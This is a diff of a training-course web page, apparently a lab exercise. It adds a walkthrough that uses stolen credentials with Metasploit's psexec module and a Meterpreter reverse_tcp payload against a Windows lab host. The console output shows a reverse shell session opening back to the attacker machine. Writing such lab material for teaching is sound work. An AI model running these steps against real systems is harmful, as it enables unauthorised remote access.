@@ -390,6 +390,57 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solution:
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Solution:">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#start-up-the-metasploit-framework-on-kali-and-load-the-windowssmbpsexec-exploit-module" class="md-nav__link">
+    <span class="md-ellipsis">
+      Start up the Metasploit framework on Kali, and load the windows/smb/psexec exploit module.
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#showing-the-options-in-the-windowssmbpsexec-exploit-module" class="md-nav__link">
+    <span class="md-ellipsis">
+      Showing the options in the windows/smb/psexec exploit module.
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#set-the-rhosts-and-running-the-psexec-module-windows-vm-1723143103" class="md-nav__link">
+    <span class="md-ellipsis">
+      Set the RHOSTS and running the psexec module (Windows VM 172.31.43.103)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-meterpreter-shell-was-sucesfully-deployed" class="md-nav__link">
+    <span class="md-ellipsis">
+      The meterpreter shell was sucesfully deployed
+    </span>
+  </a>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -429,7 +480,7 @@
         
   
   <span class="md-ellipsis">
-    Challenge 7: Finding Sensitive Files
+    Challenge 8: Finding Sensitive Files
   </span>
   
 
@@ -476,34 +527,69 @@
 <div><h1 id="challenge-6-metasploit"><strong>Challenge 6: Metasploit</strong></h1>
 <div class="admonition note"></div>
 <h2 id="procedure"><strong>Procedure:</strong></h2>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span>
-<span class="normal"><a href="#__codelineno-0-2">2</a></span>
-<span class="normal"><a href="#__codelineno-0-3">3</a></span>
-<span class="normal"><a href="#__codelineno-0-4">4</a></span>
-<span class="normal"><a href="#__codelineno-0-5">5</a></span>
-<span class="normal"><a href="#__codelineno-0-6">6</a></span>
-<span class="normal"><a href="#__codelineno-0-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'problem2.txt'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
-<a id="__codelineno-0-2" name="__codelineno-0-2"></a>    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
-<a id="__codelineno-0-3" name="__codelineno-0-3"></a>    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">file</span><span class="p">:</span>
-<a id="__codelineno-0-4" name="__codelineno-0-4"></a>        <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s1">'192.168.1.1'</span><span class="p">:</span>
-<a id="__codelineno-0-5" name="__codelineno-0-5"></a>            <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
-<a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"The IP 192.168.1.1 appears </span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s2"> times."</span><span class="p">)</span>
-<a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="c1"># The IP 192.168.1.1 appears 5 times.</span>
+<p>Now that we have a username and password, we need to use them to gain access to one of the Windows targets. Connecting using "legitimate" means like Remote Desktop Protocol (RDP) could be possible, but a Meterpreter shell can give us more user-friendly options to achieve our goals. </p>
+<ul>
+<li>Start up the Metasploit framework on Kali, and load the windows/smb/psexec exploit module. 
+Note: This module is a common exploit for gaining access to Windows machines with stolen credentials. </li>
+<li>Configure the module's options to set the username and password you found previously. You will not need to specify a domain. 
+Set the <code>RHOSTS</code> target to one of the Windows IPs you found with Nmap earlier. 
+Note: These credentials will only work on one of the two Windows machines. If the exploit fails, set the other IP address as the target and try again.</li>
+<li>Set the payload to <code>windows/x64/meterpreter/reverse_tcp</code> and confirm its options automatically configure properly.</li>
+<li>Run the exploit. If everything works, you will be dropped into a Meterpreter shell on the target system. If not, test it against the other Windows target. If neither exploit works, double-check your options (check for typos in IP addresses, usernames, passwords, etc.) </li>
+</ul>
+<h2 id="solution"><strong>Solution:</strong></h2>
+<h3 id="start-up-the-metasploit-framework-on-kali-and-load-the-windowssmbpsexec-exploit-module">Start up the Metasploit framework on Kali, and load the <code>windows/smb/psexec</code> exploit module.</h3>
+<p><img alt="alt text" src="../images/Pasted%20image%2020240508001358.png"></p>
+<h3 id="showing-the-options-in-the-windowssmbpsexec-exploit-module">Showing the options in the <code>windows/smb/psexec</code> exploit module.</h3>
+<p><img alt="alt text" src="../images/Pasted%20image%2020240508001604.png"></p>
+<h3 id="set-the-rhosts-and-running-the-psexec-module-windows-vm-1723143103">Set the RHOSTS and running the <code>psexec</code> module (Windows VM 172.31.43.103)</h3>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-0-10">10</a></span>
+<span class="normal"><a href="#__codelineno-0-11">11</a></span>
+<span class="normal"><a href="#__codelineno-0-12">12</a></span>
+<span class="normal"><a href="#__codelineno-0-13">13</a></span>
+<span class="normal"><a href="#__codelineno-0-14">14</a></span>
+<span class="normal"><a href="#__codelineno-0-15">15</a></span>
+<span class="normal"><a href="#__codelineno-0-16">16</a></span>
+<span class="normal"><a href="#__codelineno-0-17">17</a></span>
+<span class="normal"><a href="#__codelineno-0-18">18</a></span>
+<span class="normal"><a href="#__codelineno-0-19">19</a></span>
+<span class="normal"><a href="#__codelineno-0-20">20</a></span>
+<span class="normal"><a href="#__codelineno-0-21">21</a></span>
+<span class="normal"><a href="#__codelineno-0-22">22</a></span>
+<span class="normal"><a href="#__codelineno-0-23">23</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a>msf6<span class="w"> </span>exploit<span class="o">(</span>windows/smb/psexec<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>RHOST<span class="w"> </span><span class="m">172</span>.31.43.103
+<a id="__codelineno-0-2" name="__codelineno-0-2"></a><span class="hll"><span class="nv">RHOST</span><span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="m">172</span>.31.43.103
+</span><a id="__codelineno-0-3" name="__codelineno-0-3"></a>msf6<span class="w"> </span>exploit<span class="o">(</span>windows/smb/psexec<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run
+<a id="__codelineno-0-4" name="__codelineno-0-4"></a>
+<a id="__codelineno-0-5" name="__codelineno-0-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Started<span class="w"> </span>reverse<span class="w"> </span>TCP<span class="w"> </span>handler<span class="w"> </span>on<span class="w"> </span><span class="m">172</span>.31.39.126:4444<span class="w"> </span>
+<a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="m">172</span>.31.43.103:445<span class="w"> </span>-<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>server...
+<a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="m">172</span>.31.43.103:445<span class="w"> </span>-<span class="w"> </span>Authenticating<span class="w"> </span>to<span class="w"> </span><span class="m">172</span>.31.43.103:445<span class="w"> </span>as<span class="w"> </span>user<span class="w"> </span><span class="s1">'Administrator'</span>...
+<a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="m">172</span>.31.43.103:445<span class="w"> </span>-<span class="w"> </span>Selecting<span class="w"> </span>PowerShell<span class="w"> </span>target
+<a id="__codelineno-0-9" name="__codelineno-0-9"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span><span class="m">172</span>.31.43.103:445<span class="w"> </span>-<span class="w"> </span>Executing<span class="w"> </span>the<span class="w"> </span>payload...
+<a id="__codelineno-0-10" name="__codelineno-0-10"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="m">172</span>.31.43.103:445<span class="w"> </span>-<span class="w"> </span>Service<span class="w"> </span>start<span class="w"> </span>timed<span class="w"> </span>out,<span class="w"> </span>OK<span class="w"> </span><span class="k">if</span><span class="w"> </span>running<span class="w"> </span>a<span class="w"> </span><span class="nb">command</span><span class="w"> </span>or<span class="w"> </span>non-service<span class="w"> </span>executable...
+<a id="__codelineno-0-11" name="__codelineno-0-11"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Sending<span class="w"> </span>stage<span class="w"> </span><span class="o">(</span><span class="m">175686</span><span class="w"> </span>bytes<span class="o">)</span><span class="w"> </span>to<span class="w"> </span><span class="m">172</span>.31.43.103
+<a id="__codelineno-0-12" name="__codelineno-0-12"></a>PG::Coder.new<span class="o">(</span><span class="nb">hash</span><span class="o">)</span><span class="w"> </span>is<span class="w"> </span>deprecated.<span class="w"> </span>Please<span class="w"> </span>use<span class="w"> </span>keyword<span class="w"> </span>arguments<span class="w"> </span>instead!<span class="w"> </span>Called<span class="w"> </span>from<span class="w"> </span>/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/activerecord-7.0.4.3/lib/active_record/connection_adapters/postgresql_adapter.rb:980:in<span class="w"> </span><span class="sb">`</span>new<span class="err">'</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Meterpreter<span class="w"> </span>session<span class="w"> </span><span class="m">1</span><span class="w"> </span>opened<span class="w"> </span><span class="o">(</span><span class="m">172</span>.31.39.126:4444<span class="w"> </span>-&gt;<span class="w"> </span><span class="m">172</span>.31.43.103:49962<span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2024</span>-05-08<span class="w"> </span><span class="m">04</span>:20:56<span class="w"> </span>+0000
+<a id="__codelineno-0-14" name="__codelineno-0-14"></a>
+<a id="__codelineno-0-15" name="__codelineno-0-15"></a><span class="hll">meterpreter<span class="w"> </span>&gt;<span class="w"> </span>sysinfo
+</span><a id="__codelineno-0-16" name="__codelineno-0-16"></a>Computer<span class="w">        </span>:<span class="w"> </span>EC2AMAZ-L3OOUG8
+<a id="__codelineno-0-17" name="__codelineno-0-17"></a>OS<span class="w">              </span>:<span class="w"> </span>Windows<span class="w"> </span><span class="m">2016</span>+<span class="w"> </span><span class="o">(</span><span class="m">10</span>.0<span class="w"> </span>Build<span class="w"> </span><span class="m">14393</span><span class="o">)</span>.
+<a id="__codelineno-0-18" name="__codelineno-0-18"></a>Architecture<span class="w">    </span>:<span class="w"> </span>x64
+<a id="__codelineno-0-19" name="__codelineno-0-19"></a>System<span class="w"> </span>Language<span class="w"> </span>:<span class="w"> </span>en_US
+<a id="__codelineno-0-20" name="__codelineno-0-20"></a>Domain<span class="w">          </span>:<span class="w"> </span>WORKGROUP
+<a id="__codelineno-0-21" name="__codelineno-0-21"></a>Logged<span class="w"> </span>On<span class="w"> </span>Users<span class="w"> </span>:<span class="w"> </span><span class="m">0</span>
+<a id="__codelineno-0-22" name="__codelineno-0-22"></a>Meterpreter<span class="w">     </span>:<span class="w"> </span>x86/windows
+<a id="__codelineno-0-23" name="__codelineno-0-23"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>
 </code></pre></div></td></tr></table></div>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
-<span class="normal"><a href="#__codelineno-1-2">2</a></span>
-<span class="normal"><a href="#__codelineno-1-3">3</a></span>
-<span class="normal"><a href="#__codelineno-1-4">4</a></span>
-<span class="normal"><a href="#__codelineno-1-5">5</a></span>
-<span class="normal"><a href="#__codelineno-1-6">6</a></span>
-<span class="normal"><a href="#__codelineno-1-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'problem2.txt'</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
-<a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="hll">    <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
-</span><a id="__codelineno-1-3" name="__codelineno-1-3"></a><span class="hll">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">file</span><span class="p">:</span>
-</span><a id="__codelineno-1-4" name="__codelineno-1-4"></a>        <span class="k">if</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">==</span> <span class="s1">'192.168.1.1'</span><span class="p">:</span>
-<a id="__codelineno-1-5" name="__codelineno-1-5"></a>            <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
-<a id="__codelineno-1-6" name="__codelineno-1-6"></a><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"The IP 192.168.1.1 appears </span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s2"> times."</span><span class="p">)</span>
-<a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="c1"># The IP 192.168.1.1 appears 5 times.</span>
-</code></pre></div></td></tr></table></div>
+<h2 id="the-meterpreter-shell-was-sucesfully-deployed">The meterpreter shell was sucesfully deployed</h2>
 <div class="admonition note"></div>
 <div class="button-container" markdown="1">
 <a href="/Career-Simulation-3/challenge_5/" class="md-button md-button--primary">Previous: Challenge 5</a>
